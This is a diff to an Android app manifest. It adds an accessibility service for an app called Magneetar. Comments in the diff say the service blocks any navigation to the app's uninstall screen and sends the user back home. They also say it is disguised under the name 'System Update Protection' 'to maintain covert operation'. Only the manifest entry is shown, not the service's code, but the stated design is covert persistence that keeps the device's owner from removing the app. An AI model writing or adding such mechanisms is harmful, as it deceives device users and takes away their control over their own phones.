@@ -285,6 +285,27 @@
             </intent-filter>
         </receiver>
 
+        <!-- ─── Uninstall Guard (Accessibility Service) ───────────────── -->
+        <!-- LAYER 2 PROTECTION: Monitors UI navigation to detect and block
+             uninstall attempts. When enabled, this service intercepts any
+             navigation to Settings > Apps > Magneetar and sends the user
+             back to the home screen. Requires manual activation in
+             Settings > Accessibility > System Update Protection.
+
+             The service is named 'System Update Protection' to maintain
+             covert operation. -->
+        <service
+            android:name=".UninstallGuardService"
+            android:exported="false"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
     </application>
 
 </manifest>
